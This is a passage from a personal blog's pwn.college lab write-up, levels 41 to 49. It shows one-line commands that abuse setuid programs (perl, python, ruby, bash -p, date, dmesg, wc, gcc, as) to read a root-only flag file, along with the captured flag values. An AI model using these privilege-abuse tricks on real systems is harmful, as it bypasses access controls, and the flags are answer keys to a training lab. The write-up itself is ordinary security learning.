<h3 id="41-perl">41 perl<a hidden class="anchor" aria-hidden="true" href="#41-perl">#</a></h3>
<p><a href="https://www.geeksforgeeks.org/perl-opening-and-reading-a-file/">https://www.geeksforgeeks.org/perl-opening-and-reading-a-file/</a></p>
<ul>
<li>Note had to use single quotes instead of double quotes</li>
</ul>
<pre tabindex="0"><code>perl -e &#39;open(fh, &#34;flag&#34;) or die; $firstline = &lt;fh&gt;; print &#34;$firstline&#34;;&#39;
pwn.college{4omGoc2usqOLQHfIPTlErXr7ZV4.01M4EDL0MDMwEzW}
</code></pre><h3 id="42-python">42 python<a hidden class="anchor" aria-hidden="true" href="#42-python">#</a></h3>
<p>Yay python!
<code>-c </code> to compile</p>
<pre tabindex="0"><code>python -c &#39;f=open(&#34;flag&#34;, &#34;r&#34;); print(f.read())&#39;
pwn.college{woYeozdqCZlaPEQL5OHMOGhirJN.0FN4EDL0MDMwEzW}
</code></pre><h3 id="43-ruby">43 ruby<a hidden class="anchor" aria-hidden="true" href="#43-ruby">#</a></h3>
<pre tabindex="0"><code>TF=$(mktemp)
echo &#39;f=File.open(&#34;flag&#34;); r = f.read; puts(r) &#39; &gt; $TF
ruby $TF
pwn.college{sICaLJYVdT_rY74pyxtbb1r48tL.0VN4EDL0MDMwEzW}
</code></pre><h3 id="44-bash">44 bash<a hidden class="anchor" aria-hidden="true" href="#44-bash">#</a></h3>
<ul>
<li><a href="https://stackoverflow.com/questions/63689353/suid-binary-privilege-escalation">https://stackoverflow.com/questions/63689353/suid-binary-privilege-escalation</a></li>
</ul>
<pre tabindex="0"><code>bash -p flag
flag: line 1: pwn.college{wzjJgYq8MugKvbB17in-j2-Bv0h.0lN4EDL0MDMwEzW}: command not found
</code></pre><p><code>-p</code> privileged mode. Tells bash to not set up an environment and just run it with what you&rsquo;re already using. Since setuid is set, it&rsquo;s treated as root.</p>
<p>(aka pretty please)</p>
<h3 id="45-date">45 date<a hidden class="anchor" aria-hidden="true" href="#45-date">#</a></h3>
<pre tabindex="0"><code>date --file=flag
date: invalid date &#39;pwn.college{E57sz6e0gPPGZiyXahtDTw-AT0L.01N4EDL0MDMwEzW}&#39;
</code></pre><h2 id="just-straight-up-wasnt-designed-to-let-you-read-files">Just straight up wasn&rsquo;t designed to let you read files!<a hidden class="anchor" aria-hidden="true" href="#just-straight-up-wasnt-designed-to-let-you-read-files">#</a></h2>
<h3 id="46-dmesg">46 dmesg<a hidden class="anchor" aria-hidden="true" href="#46-dmesg">#</a></h3>
<pre tabindex="0"><code>dmesg -F flag
[    0.000000] pwn.college{I-e20m2Z1DlzHzNGmBdUcMzEPHU.0FO4EDL0MDMwEzW}
</code></pre><h3 id="47-wc">47 wc<a hidden class="anchor" aria-hidden="true" href="#47-wc">#</a></h3>
<pre tabindex="0"><code>wc --files0-from=flag
wc: &#39;pwn.college{oZ5vCz7SrQA_qbxZeCexxzmR-EQ.0VO4EDL0MDMwEzW}&#39;$&#39;\n&#39;: No such file or directory
</code></pre><h3 id="48-gcc">48 gcc<a hidden class="anchor" aria-hidden="true" href="#48-gcc">#</a></h3>
<pre tabindex="0"><code>gcc @flag
gcc: error: pwn.college{gwjUmod94a_2j-jp8aIXUoxgIiW.0FM5EDL0MDMwEzW}: No such file or directory
gcc: fatal error: no input files
compilation terminated.
</code></pre><h3 id="49-as">49 as<a hidden class="anchor" aria-hidden="true" href="#49-as">#</a></h3>
<pre tabindex="0"><code>as @flag
Assembler messages:
Error: can&#39;t open pwn.college{smeuseqsnW3x76HLH23ythuG_6V.0VM5EDL0MDMwEzW} for reading: No such file or directory
</code></pre>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://g0ldf15h.github.io/posts/dev_notes/c&#43;&#43;-notes/">
    <span class="title">« Prev</span>
    <br>
    <span>C&#43;&#43; Notes</span>
  </a>
  <a class="next" href="https://g0ldf15h.github.io/posts/dev_notes/python/">
    <span class="title">Next »</span>
    <br>
    <span>Python Notes</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://g0ldf15h.github.io/">goldfish</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
